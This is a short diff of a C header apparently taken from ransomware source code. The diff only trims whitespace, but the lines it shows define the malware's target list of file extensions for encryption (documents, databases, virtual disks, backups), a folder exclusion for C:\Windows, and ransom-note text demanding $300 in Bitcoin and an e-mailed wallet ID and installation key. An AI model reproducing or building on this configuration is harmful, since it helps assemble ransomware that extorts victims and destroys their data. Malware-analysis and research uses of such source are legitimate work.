@@ -9,7 +9,7 @@
 #define FILE_EXT_WHITE L".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb" \
                        L".gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln"  \
                        L".sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip."
-                       
+
 #define FOLDER_BLCKLST L"C:\\Windows;"
 
 //
@@ -33,7 +33,7 @@
 						 L"\r\n" \
 						 L"1.\tSend $300 worth of Bitcoin to following address:\r\n" \
 						 L"\r\n"
-						 
+
 #define RANSOM_NOTE_TXT2 L"2.\tSend your Bitcoin wallet ID and personal installation key to e-mail "
 
 #define RANSOM_NOTE_TXT3 L"\tYour personal installation key:\r\n\r\n"
